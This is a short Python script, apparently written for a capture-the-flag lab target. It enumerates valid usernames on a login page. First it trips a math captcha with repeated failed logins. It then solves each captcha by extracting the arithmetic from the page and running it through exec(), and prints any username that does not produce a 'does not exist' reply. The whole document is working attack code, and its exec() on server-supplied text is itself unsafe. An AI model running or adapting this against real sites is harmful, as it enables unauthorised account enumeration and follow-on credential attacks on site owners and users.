#!/usr/bin/python3

import requests
import re

url = "http://10.10.21.236/login"

user_file =  open("usernames.txt", "r")

for i in range(10):
	data = {"username":"test", "password":"test"}
	r = requests.post(url, data=data)

for i in user_file:

	user = i.split()

	captcha = re.findall("[0-9]* + .* = \?", r.text)
	exec("captcha_result =" + captcha[0][4:-4])

	data = {"username":user, "password":"test", "captcha":captcha_result}
	r = requests.post(url, data=data)

	if not "does not exist" in r.text:
		print("\033[1;32m[+] User Found!: \n" + str(user[0]))
